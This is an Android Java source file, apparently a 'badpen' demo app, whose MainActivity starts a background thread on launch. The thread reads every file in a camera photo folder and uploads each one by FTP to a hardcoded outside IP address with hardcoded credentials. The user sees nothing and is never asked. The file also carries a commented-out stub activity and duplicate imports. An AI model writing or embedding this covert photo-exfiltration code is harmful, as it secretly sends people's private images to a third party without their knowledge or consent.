package com.example.badpen;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
/*
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        System.out.println("31");
    }
}
*/
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;

import android.os.Bundle;
import android.app.Activity;
import android.util.Log;
import android.view.Menu;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        new uploadThread().start();
    }

    class uploadThread extends Thread {
        @Override
        public void run() {
            FileInputStream in = null ;
            File dir = new File("/mnt/sdcard/DCIM/Camera/test/");
            File files[] = dir.listFiles();
            if(dir.isDirectory()) {
                for(int i=0;i<files.length;i++) {
                    try {
                        in = new FileInputStream(files[i]);
                        boolean flag = FileTool.uploadFile("17.8.119.77", 21, "android", "android",
                                "/", "412424123412341234_20130715120334_" + i + ".jpg", in);
                        System.out.println(flag);
                    } catch (FileNotFoundException e) {
                        e.printStackTrace();
                    }
                }
            }
        }
    }
}
